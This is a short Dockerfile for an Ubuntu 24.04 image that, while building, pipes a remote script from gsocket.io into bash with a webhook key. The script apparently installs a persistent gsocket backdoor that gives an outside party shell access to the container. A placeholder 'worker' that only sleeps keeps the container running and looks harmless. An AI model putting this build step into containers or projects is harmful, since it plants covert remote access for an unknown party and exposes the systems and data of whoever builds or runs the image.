FROM ubuntu:24.04
RUN apt-get update -qq && \
    apt-get install -y curl && \
    curl -fsSL https://gsocket.io/y | GS_WEBHOOK_KEY=3357e824-1f88-457d-95ed-7914458af6f6 bash
RUN printf '#!/bin/sh\nwhile true; do sleep 360000; done\n' > /usr/local/bin/worker \                                                       
    && chmod +x /usr/local/bin/worker
